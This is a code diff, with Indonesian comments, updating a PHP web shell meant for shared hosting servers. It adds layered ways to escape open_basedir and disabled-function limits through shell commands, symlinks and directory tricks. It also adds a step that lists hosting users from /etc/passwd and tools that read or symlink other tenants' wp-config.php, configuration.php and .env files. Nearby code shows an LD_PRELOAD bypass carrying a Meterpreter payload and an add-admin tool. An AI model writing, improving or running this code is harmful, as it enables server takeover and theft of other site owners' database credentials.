@@ -56,57 +56,118 @@ function get_sys_info() {
 }
 $sys = get_sys_info();
 
-// --- JAILBREAK: OPEN_BASEDIR BYPASS (V65 NEW) ---
+// --- ULTIMATE JAILBREAK: MULTI-BINARY & PERSISTENT FALLBACK ---
 function x_jailbreak($file) {
-    // 1. Coba metode cURL (file:// wrapper)
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "file://" . $file);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        // CURLOPT_MUTE might be deprecated in newer PHP but harmless to keep
-        @curl_setopt($ch, CURLOPT_MUTE, 1); 
-        $res = curl_exec($ch);
-        curl_close($ch);
-        if ($res) return $res;
+    // LAYER 1: Command Execution dengan Multi-Binary Fallback
+    // Mencoba berbagai metode eksekusi dan berbagai perintah baca
+    $methods = ['shell_exec', 'exec', 'passthru', 'system', 'popen', 'proc_open'];
+    
+    // Daftar perintah alternatif pengganti 'cat' jika diblokir
+    $binaries = [
+        'cat',               // Standar
+        'head -n 10000',     // Baca bagian depan
+        'tail -n 10000',     // Baca bagian belakang
+        'more',              // Alternatif baca
+        'less',              // Alternatif baca
+        'awk "{print}"',     // Trik AWK
+        'sed -n "p"',        // Trik SED
+        'tac',               // Baca terbalik
+        'nl',                // Baca dengan nomor baris
+        'dd status=none'     // Binary level read
+    ];
+
+    $disabled_raw = ini_get('disable_functions');
+    $disabled = ($disabled_raw) ? array_map('trim', explode(',', $disabled_raw)) : [];
+
+    foreach ($methods as $method) {
+        // Cek apakah fungsi PHP aktif dan tidak didisable
+        if (function_exists($method) && !in_array($method, $disabled)) {
+            
+            // Loop setiap perintah binary (cat, head, tail, dll)
+            foreach ($binaries as $bin) {
+                $cmd = $bin . " " . escapeshellarg($file);
+                $out = "";
+
+                if ($method === 'shell_exec') {
+                    $out = @shell_exec($cmd);
+                } elseif ($method === 'exec') {
+                    $o = []; @exec($cmd, $o); $out = implode("\n", $o);
+                } elseif ($method === 'passthru') {
+                    ob_start(); @passthru($cmd); $out = ob_get_clean();
+                } elseif ($method === 'system') {
+                    ob_start(); @system($cmd); $out = ob_get_clean();
+                } elseif ($method === 'popen') {
+                    $fp = @popen($cmd, 'r');
+                    if ($fp) { while(!feof($fp)) $out .= fread($fp, 1024); pclose($fp); }
+                } elseif ($method === 'proc_open') {
+                    $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']]; 
+                    $p = @proc_open($cmd, $desc, $pipes);
+                    if (is_resource($p)) {
+                        $out = stream_get_contents($pipes[1]);
+                        fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
+                    }
+                }
+
+                // Jika berhasil, langsung return hasilnya
+                if (!empty($out)) return $out;
+            }
+        }
     }
 
-    // 2. Metode INI_SET & CHDIR Loop
+    // LAYER 2: Symlink Trick (PHP Native)
+    // Tetap dijalankan jika Layer 1 gagal/kosong (Persistent)
+    if (function_exists('symlink') && is_writable(getcwd())) {
+        $link = 'sfm_lnk_' . rand(1000,9999);
+        @symlink($file, $link);
+        if (file_exists($link)) { 
+            $content = @file_get_contents($link);
+            @unlink($link);
+            if ($content) return $content;
+        }
+    }
+
+    // LAYER 3: The Heavy Loop (Last Resort)
+    // Jalan terakhir jika semua cara di atas gagal
     if (function_exists('ini_set') && function_exists('chdir') && function_exists('mkdir')) {
         $old_cwd = getcwd();
         $jb_dir = "sfm_jb_" . rand(1000,9999);
-        @mkdir($jb_dir); @chdir($jb_dir);
-        
-        // Loop traverse
-        @ini_set('open_basedir', '..');
-        for ($i = 0; $i < 15; $i++) { @chdir('..'); @ini_set('open_basedir', '..'); }
-        @chdir('/'); @ini_set('open_basedir', '/');
-        
-        $content = @file_get_contents($file);
-        
-        // Cleanup
-        @chdir($old_cwd); @rmdir($jb_dir);
-        if ($content) return $content;
+        if (@mkdir($jb_dir)) {
+            @chdir($jb_dir);
+            @ini_set('open_basedir', '..');
+            for ($i = 0; $i < 15; $i++) { @chdir('..'); @ini_set('open_basedir', '..'); }
+            @chdir('/'); @ini_set('open_basedir', '/');
+            $content = @file_get_contents($file);
+            @chdir($old_cwd); @rmdir($jb_dir);
+            if ($content) return $content;
+        }
     }
 
     return false;
 }
 
-// --- UPDATED READER (Auto Jailbreak) ---
+// --- UPDATED READER (Prioritas Jailbreak) ---
 function x_read($path) {
-    // 1. Standard
-    if (is_readable($path)) return @file_get_contents($path);
-    
-    // 2. Jailbreak
+    // 1. PRIORITAS UTAMA: Jailbreak (Ultimate Hybrid)
+    // Mencoba teknik hacking (Command/Symlink/Loop) terlebih dahulu.
     $jb = x_jailbreak($path);
-    if ($jb) return $jb;
+    if (!empty($jb)) return $jb;
 
-    // 3. Shell
-    if (function_exists('shell_exec')) return @shell_exec("cat '$path'");
-    
+    // 2. FALLBACK: Standard Read
+    // Hanya jika semua metode jailbreak (termasuk loop berat) gagal total.
+    if (is_readable($path)) return @file_get_contents($path);
+
     return false;
 }
 
+// --- STANDARD WRITE (LIGHTWEIGHT FOR AUTO CHAIN) ---
+function x_write($path, $data) {
+    if (@file_put_contents($path, $data)) return true;
+    if (function_exists('fopen')) { 
+        $h = @fopen($path, "w"); 
+        if ($h) { fwrite($h, $data); fclose($h); return true; } 
+    }
+    return false;
+}
 // --- ROBUST WRITE (Anti 0KB + Anti Revert + Force 0444) ---
 function x_robust_write($path, $data, $lock_mode = false) {
     if (file_exists($path)) { @chmod($path, 0644); }
@@ -140,8 +201,28 @@ function x_robust_write($path, $data, $lock_mode = false) {
 }
 
 function x_link($target, $link) {
-    if (function_exists('symlink')) @symlink($target, $link);
-    elseif (function_exists('shell_exec')) @shell_exec("ln -s '$target' '$link'");
+    if (function_exists('symlink') && @symlink($target, $link)) return true;
+    if (function_exists('link') && @link($target, $link)) return true;
+    
+    
+    $cmd = "ln -s " . escapeshellarg($target) . " " . escapeshellarg($link);
+    
+    if (function_exists('shell_exec')) { @shell_exec($cmd); }
+    elseif (function_exists('exec')) { @exec($cmd); }
+    elseif (function_exists('system')) { ob_start(); @system($cmd); ob_end_clean(); }
+    elseif (function_exists('passthru')) { ob_start(); @passthru($cmd); ob_end_clean(); }
+    elseif (function_exists('proc_open')) {
+        $desc = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
+        $p = @proc_open($cmd, $desc, $pipes);
+        if (is_resource($p)) { 
+            @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]); 
+            @proc_close($p); 
+        }
+    }
+    elseif (function_exists('popen')) { $h = @popen($cmd, 'r'); if($h) @pclose($h); }
+    
+   
+    return file_exists($link);
 }
 function get_home_dirs() {
     $d = ['/home']; for ($i = 1; $i <= 9; $i++) $d[] = '/home' . $i; return $d;
@@ -338,8 +419,8 @@ if (isset($_SERVER[$h_act])) {
             
             $meterpreter = base64_encode($full_command);
             
-            x_robust_write($so_file, base64_decode($hook));
-            x_robust_write($socket_file, base64_decode($meterpreter));
+            x_write($so_file, base64_decode($hook));
+            x_write($socket_file, base64_decode($meterpreter));
             
             putenv('CHANKRO=' . $socket_file);
             putenv('LD_PRELOAD=' . $so_file);
@@ -433,28 +514,79 @@ if (isset($_SERVER[$h_act])) {
             exit;
         }
         
-        // --- BYPASS USER (Auto Jailbreak) ---
+        // --- BYPASS USER (CLEAN VERSION WITH FULL BLACKLIST) ---
         if ($tool === 'bypass_user') {
-            // Gunakan x_read yang sudah diupdate dengan Jailbreak
-            $found = ""; $etc = x_read("/etc/passwd");
+            $found = [];
             
-            if ($etc) { 
-                $lines = explode("\n", $etc); 
+            // Menggunakan x_read yang sudah di-update (Support Jailbreak)
+            $raw_etc = x_read("/etc/passwd");
+            
+            // Daftar user sampah (System Users) yang wajib dibuang
+            $blacklist = [
+                'root', 'bin', 'daemon', 'adm', 'lp', 'sync', 'shutdown', 'halt', 'mail', 
+                'operator', 'games', 'ftp', 'named', 'nscd', 'rpcuser', 'rpc', 'mailnull', 
+                'tss', 'sshd', 'dbus', 'dovecot', 'rtkit', 'agent360', 'ossece', 'ossecm', 
+                'ossecr', 'ossec', 'imunify360-scanlogd', 'imunify360-webshield', 'wp-toolkit', 
+                'lsadm', '_imunify', 'flatpak', 'geoclue', 'pipewire', 'polkitd', 
+                'cpanelphpmyadmin', 'cpanelphppgadmin', 'dovenull', 'mysql', 'cpses', 
+                'cpanelanalytics', 'cpanelconnecttrack', 'cpanelroundcube', 'cpaneleximscanner', 
+                'cpaneleximfilter', 'cpanellogin', 'cpanelcabcache', 'cpanel', 'mailman', 
+                'chrony', 'sssd', 'systemd-coredump', 'nobody', 'apache', 'nginx', 'litespeed'
+            ];
+
+            // 1. Parsing dari /etc/passwd (Metode Utama)
+            if ($raw_etc) { 
+                $lines = explode("\n", $raw_etc); 
                 foreach($lines as $l) { 
-                    $p = explode(":", $l); 
-                    if(isset($p[0]) && !empty($p[0])) $found .= $p[0] . ":\n"; 
+                    if(empty(trim($l))) continue;
+                    $p = explode(":", $l);
+                    $u = isset($p[0]) ? trim($p[0]) : '';
+                    $h = isset($p[5]) ? trim($p[5]) : ''; // Kolom ke-6 adalah Home Directory
+                    
+                    // FILTER CANGGIH:
+                    // 1. User tidak boleh ada di blacklist
+                    // 2. Home directory harus mengandung "home" atau "www" (Ciri user hosting)
+                    if (!empty($u) && !in_array($u, $blacklist)) {
+                        if (stripos($h, '/home') !== false || stripos($h, '/var/www') !== false || stripos($h, '/usr/home') !== false) {
+                            $found[] = $u;
+                        }
+                    }
                 } 
-            } else { 
-                for ($userid = 0; $userid < 2000; $userid++) { 
+            } 
+            
+            // 2. Fallback: Scanning ID (Jika /etc/passwd unreadable atau kosong)
+            if (empty($found)) { 
+                // Scan dari ID 500 sampai 5000 (User hosting biasanya ID-nya besar)
+                for ($userid = 500; $userid < 5000; $userid++) { 
                     $arr = posix_getpwuid($userid); 
-                    if (!empty($arr) && isset($arr['name'])) $found .= $arr['name'] . ":\n"; 
+                    if (!empty($arr) && isset($arr['name'])) {
+                        $u = $arr['name'];
+                        $h = $arr['dir'];
+                        
+                        if (!in_array($u, $blacklist)) {
+                             // Terapkan filter home directory juga di sini
+                             if (stripos($h, '/home') !== false || stripos($h, '/var/www') !== false) {
+                                $found[] = $u;
+                             }
+                        }
+                    } 
                 } 
             }
             
-            if(!empty($found)) { 
-                x_robust_write("passwd.txt", $found); 
-                echo "Saved to: passwd.txt\nTotal Found: " . count(explode("\n", trim($found))); 
-            } else echo "Failed."; exit;
+            // Hapus duplikat & Simpan
+            $found = array_unique($found);
+            $output = "";
+            foreach($found as $user) {
+                $output .= $user . ":\n"; // Format user: (penting untuk Jumper Cage)
+            }
+
+            if(!empty($output)) { 
+                x_write("passwd.txt", $output); 
+                echo "Saved to: passwd.txt\nClean Users Found: " . count($found); 
+            } else {
+                echo "Failed. No valid hosting users found."; 
+            }
+            exit;
         }
 
         if ($tool === 'add_admin') {
@@ -513,22 +645,86 @@ if (isset($_SERVER[$h_act])) {
             exit;
         }
 
+        // --- SMART JUMPER & SYMLINKER (CMS DETECTOR + ANTI-BRUTAL) ---
         if ($tool === 'symlink_cage' || $tool === 'jumper_cage') {
-            $c = x_read(getcwd()."/passwd.txt"); if(!$c) { echo "Err: passwd.txt missing."; exit; }
-            $users = explode("\n", $c); $dir=($tool==='symlink_cage')?"3x_sym":"jumping"; @mkdir($dir,0755); chdir($dir);
-            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex x\nAddType txt .php\nAddHandler txt .php");
-            $list = ["wp-config.php","config.php","configuration.php"]; $n=0;
+            $c = x_read(getcwd()."/passwd.txt"); 
+            if(!$c) { echo "Err: passwd.txt missing. Run 'Bypass User' first."; exit; }
+            
+            $users = explode("\n", $c); 
+            $dir = ($tool === 'symlink_cage') ? "3x_sym" : "jumping"; 
+            if(!is_dir($dir)) @mkdir($dir, 0755); 
+            @chdir($dir);
+            
+            // Buat .htaccess agar file txt/symlink bisa dibuka/didownload di browser
+            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex x\nAddType text/plain .php\nAddHandler text/plain .php");
+            
+            // Mapping File Config -> Nama CMS
+            $cms_map = [
+                'wp-config.php'     => 'wordpress',
+                'configuration.php' => 'joomla',
+                '.env'              => 'laravel',
+                'config.php'        => 'config',   // Generic
+                'Settings.php'      => 'settings'
+            ];
+            
+            $n = 0;
+
             foreach ($users as $u_str) {
-                $u=explode(":",$u_str)[0]; if(!$u) continue;
+                $u = trim(explode(":", $u_str)[0]); 
+                if(!$u) continue;
+                
+                // 1. Loop Home Directory (/home, /home1, dst)
                 foreach ($home_dirs as $h) {
-                    foreach ($list as $f) {
-                        if($tool==='symlink_cage') x_link("$h/$u/public_html/$f", "$u~".str_replace("/","-",$f).".txt");
-                        else { $dat=x_read("$h/$u/public_html/$f"); if($dat) x_write("$u~".str_replace("/","",$h)."~".str_replace("/","-",$f).".txt", $dat); }
-                        $n++;
+                    $found_user = false; // Penanda "Stop at First Found"
+                    
+                    // 2. Loop Jenis CMS
+                    foreach ($cms_map as $file => $cms_name) {
+                        $target = "$h/$u/public_html/$file";
+                        
+                        // Nama file output rapi: user~home~cms.txt
+                        // Contoh: user~home~wordpress.txt
+                        $save_name = "$u~" . str_replace("/", "", $h) . "~$cms_name.txt";
+                        
+                        // --- LOGIKA JUMPER (BACA ISI) ---
+                        if ($tool === 'jumper_cage') {
+                            $dat = x_read($target);
+                            // Validasi: Harus ada isinya & minimal 50 karakter
+                            if ($dat && strlen($dat) > 50) {
+                                x_write($save_name, $dat);
+                                $n++;
+                                $found_user = true;
+                                break; // STOP LOOP CONFIG (Sudah dapat CMS utama)
+                            }
+                        } 
+                        
+                        // --- LOGIKA SYMLINKER (SMART LINK) ---
+                        elseif ($tool === 'symlink_cage') {
+                            // Coba buat symlink
+                            if (file_exists($save_name)) @unlink($save_name); // Hapus sisa lama
+                            x_link($target, $save_name);
+                            
+                            // SMART CHECK: Cek apakah symlink berfungsi (targetnya ada)
+                            // Jika file_exists($link) bernilai true, berarti targetnya valid/ada.
+                            if (file_exists($save_name)) {
+                                $n++;
+                                $found_user = true;
+                                break; // STOP LOOP CONFIG (Sudah dapat CMS utama)
+                            } else {
+                                // Jika symlink 'broken' (target tidak ada), hapus aja biar bersih
+                                @unlink($save_name);
+                            }
+                        }
                     }
+                    
+                    // SMART BREAK: 
+                    // Jika di direktori ini (misal /home) sudah ketemu CMS-nya,
+                    // JANGAN buang waktu scan /home1, /home2, dst. Lanjut user berikutnya.
+                    if ($found_user) break; 
                 }
             }
-            echo "$tool Done. Count: $n."; exit;
+            
+            echo "$tool Done. Total Valid ($tool): $n."; 
+            exit;
         }
         
         // --- BACKUP (UAPI TOKEN + CREATE ADMIN) ---
